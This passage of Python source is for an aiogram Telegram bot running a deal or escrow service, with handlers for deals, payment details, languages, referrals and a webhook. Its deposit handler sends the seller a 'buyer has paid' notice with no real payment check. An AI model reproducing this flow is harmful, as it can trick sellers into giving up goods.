@dp.callback_query(F.data == "my_deals")
async def my_deals(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT deal_id, deal_type, description, amount, currency, status FROM deals WHERE seller_id=? OR buyer_id=?", (user_id, user_id))
        deals = cur.fetchall()
        if not deals:
            await callback.message.answer(tr('my_deals_empty', 'ru'))
            await callback.answer()
            return
        deals_text = ""
        for d in deals:
            desc = d[2][:30] + "..." if len(d[2]) > 30 else d[2]
            deals_text += f"#{d[0]} | {d[1]} | {desc} | {d[3]} {d[4]} | {d[5]}\n"
        await bot.send_message(callback.message.chat.id, tr('my_deals_list', 'ru').format(deals=deals_text), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка my_deals: {e}")
        await callback.message.answer("🚫 Ошибка при загрузке сделок.")
    await callback.answer()

@dp.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('requisites_menu', lang), reply_markup=get_requisites_menu(lang), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data.startswith("req_"))
async def requisites_edit(callback: CallbackQuery, state: FSMContext):
    req_type = callback.data.split("_")[1]
    await state.update_data(req_type=req_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    if req_type == "card":
        text = tr('requisites_card', lang)
    elif req_type == "crypto":
        text = tr('requisites_crypto', lang)
    else:
        text = tr('requisites_stars', lang)
    await bot.send_message(callback.message.chat.id, text, parse_mode="HTML")
    await state.set_state(DealStates.profile_requisites_input)
    await callback.answer()

@dp.message(DealStates.profile_requisites_input)
async def save_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    req_type = data['req_type']
    value = message.text.strip()
    if not value:
        await message.answer("⚠️ Реквизиты не могут быть пустыми. Введите данные.")
        return
    user_id = message.from_user.id
    try:
        if req_type == "card":
            cur.execute("UPDATE users SET card=? WHERE user_id=?", (value, user_id))
        elif req_type == "crypto":
            cur.execute("UPDATE users SET crypto=? WHERE user_id=?", (value, user_id))
        else:
            cur.execute("UPDATE users SET stars_username=? WHERE user_id=?", (value, user_id))
        conn.commit()
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
        await message.answer(tr('requisites_saved', lang))
    except Exception as e:
        logging.error(f"Ошибка сохранения реквизитов: {e}")
        await message.answer("🚫 Ошибка сохранения.")
    await state.clear()

@dp.callback_query(F.data == "lang")
async def lang_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="🇨🇳 中文", callback_data="lang_zh"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    await bot.send_message(callback.message.chat.id, tr('lang_menu', lang), reply_markup=builder.as_markup(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: CallbackQuery):
    lang = callback.data.split("_")[1]
    user_id = callback.from_user.id
    try:
        cur.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка смены языка: {e}")
        await callback.message.answer("🚫 Ошибка.")
        await callback.answer()
        return
    await callback.message.answer(tr('lang_set', lang).format(lang=lang))
    await callback.answer()

# ==================================================
# ПОДДЕРЖКА (КНОПКА НА МЕНЕДЖЕРА)
# ==================================================
@dp.callback_query(F.data == "support")
async def support(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = tr('support', lang)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📩 Написать в поддержку", url="https://t.me/GiftsforFunpay")]
    ])
    await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

# ==================================================
# ВЕРИФИКАЦИЯ (ФОТО + ТЕКСТ + КНОПКА)
# ==================================================
@dp.callback_query(F.data == "verify")
async def verify(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = tr('verify', lang)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📩 Подать заявку", url="https://t.me/GiftsforFunpay")]
    ])
    # Отправляем фото (ошибки загружаем игнором)
    try:
        await bot.send_photo(callback.message.chat.id, photo=PHOTO_URL)
    except:
        pass
    # Гарантированно отправляем текст с кнопкой отдельным сообщением
    await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

# ==================================================
# РЕФЕРАЛЫ (РЕФЕРАЛЬНАЯ ССЫЛКА)
# ==================================================
@dp.callback_query(F.data == "referral")
async def referral(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
        cur.execute("SELECT ref_count FROM users WHERE user_id=?", (user_id,))
        ref_count = cur.fetchone()[0]
        await bot.send_message(callback.message.chat.id, tr('referral', lang).format(bot_username=BOT_USERNAME, user_id=user_id, ref_count=ref_count), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка рефералов: {e}")
        await callback.message.answer("🚫 Ошибка.")
    await callback.answer()

# ==================================================
# О СЕРВИСЕ (ФОТО + ТЕКСТ)
# ==================================================
@dp.callback_query(F.data == "about")
async def about(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = tr('about', lang)
    # Отправляем фото (если упадет - пофиг, идет дальше)
    try:
        await bot.send_photo(callback.message.chat.id, photo=PHOTO_URL)
    except:
        pass
    # Гарантированно отправляем текст и кнопку назад сообщением
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu")]
    ])
    await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

# ==================================================
# FUNDS ОБРАБОТЧИКИ
# ==================================================
@dp.callback_query(F.data == "funds_deposit")
async def funds_deposit(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('funds_deposit', lang), parse_mode="HTML")
    await state.set_state(DealStates.funds_deposit)
    await callback.answer()

@dp.message(DealStates.funds_deposit)
async def funds_deposit_handle(message: Message, state: FSMContext):
    deal_id = message.text.strip()
    try:
        cur.execute("SELECT seller_id, buyer_id, status FROM deals WHERE deal_id=?", (deal_id,))
        row = cur.fetchone()
        if not row:
            await message.answer(tr('funds_deposit_error', 'ru'))
            return
        seller_id, buyer_id, status = row
        if message.from_user.id not in (seller_id, buyer_id):
            await message.answer("🚫 Вы не участник этой сделки.")
            return
        if status != 'active':
            await message.answer("🚫 Сделка не активна или уже завершена.")
            return
        await message.answer("✅ Оплата по сделке принята (имитация). Ожидайте подтверждения.")
        if message.from_user.id == seller_id:
            pass
        else:
            await bot.send_message(seller_id, f"💳 Покупатель оплатил сделку #{deal_id}. Передайте товар.")
    except Exception as e:
        logging.error(f"Ошибка обработки депозита: {e}")
        await message.answer("🚫 Ошибка при обработке.")
    await state.clear()

@dp.callback_query(F.data == "funds_withdraw")
async def funds_withdraw(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('funds_withdraw', lang), parse_mode="HTML")
    await callback.answer()

# ==================================================
# ВЕБХУК И ЗАПУСК
# ==================================================
async def on_startup(app):
    logging.info("Bot started (web server up)")

async def on_shutdown(app):
    try:
        conn.close()
        logging.info("Database connection closed.")
    except Exception as e:
        logging.error(f"Error closing DB: {e}")
    logging.info("Bot stopped (web server down)")

async def handle(request):
    return web.Response(text="Bot is alive")

async def webhook_handler(request):
    try:
        update = types.Update(**(await request.json()))
        await dp.feed_update(bot, update)
        return web.Response(text="OK")
    except Exception as e:
        logging.error(f"Webhook error: {e}")
        return web.Response(text="Error", status=500)

async def main():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_post("/", webhook_handler)
    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=PORT)
    await site.start()
    logging.info(f"Web server started on port {PORT}")

    await bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True)
    logging.info(f"Webhook set to {WEBHOOK_URL}. Waiting for updates...")

    while True:
        await asyncio.sleep(60)

if __name__ == "__main__":
    asyncio.run(main())
